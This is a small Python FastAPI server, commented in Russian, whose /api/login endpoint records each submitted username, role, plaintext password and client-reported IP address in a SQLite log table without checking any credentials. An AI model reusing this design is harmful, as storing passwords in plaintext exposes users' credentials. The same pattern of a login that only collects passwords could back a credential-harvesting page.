from fastapi import FastAPI
from pydantic import BaseModel
import sqlite3
from datetime import datetime
from typing import Optional

app = FastAPI()

# Имя файла нашей базы данных
DB_NAME = "database.db"

def init_db():
    """Функция, которая создает таблицу в базе данных и добавляет нужные колонки"""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    
    # Создаем таблицу для логов входа (добавили поле client_ip)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS user_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            role TEXT NOT NULL,
            password TEXT,
            client_ip TEXT,
            login_time TEXT NOT NULL
        )
    """)
    
    # Проверка на случай, если таблица старая и в ней нет колонок password или client_ip
    cursor.execute("PRAGMA table_info(user_logs)")
    columns = [column[1] for column in cursor.fetchall()]
    
    if "password" not in columns:
        print("[DB INFO] Добавляем отсутствующую колонку password в таблицу user_logs...")
        cursor.execute("ALTER TABLE user_logs ADD COLUMN password TEXT")
        
    if "client_ip" not in columns:
        print("[DB INFO] Добавляем отсутствующую колонку client_ip в таблицу user_logs...")
        cursor.execute("ALTER TABLE user_logs ADD COLUMN client_ip TEXT")
        
    conn.commit()
    conn.close()

# Запускаем создание/проверку таблицы при старте сервера
init_db()

class LoginData(BaseModel):
    username: str
    role: str
    password: str = ""       # Поле для пароля
    client_ip: Optional[str] = "Не указан"  # Принимаем IP-адрес, отправленный клиентом

@app.get("/")
def read_root():
    return {"status": "Server is running", "db": "SQLite connected"}

@app.post("/api/login")
def login_user(data: LoginData):
    # Получаем текущее время
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Записываем данные в нашу SQLite базу (включая client_ip)
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO user_logs (username, role, password, client_ip, login_time) VALUES (?, ?, ?, ?, ?)",
        (data.username, data.role, data.password, data.client_ip, current_time)
    )
    conn.commit()
    conn.close()

    print(f"\n[🚀 SERVER LOG] Получен запрос от {data.username} ({data.role})")
    print(f"[📍 IP LOG] Адрес клиента: {data.client_ip}")
    print(f"[SQLITE LOG] Данные успешно записаны в БД!")
    
    return {"status": "success", "saved_to_db": True}
# uvicorn server:app --reload --port 8000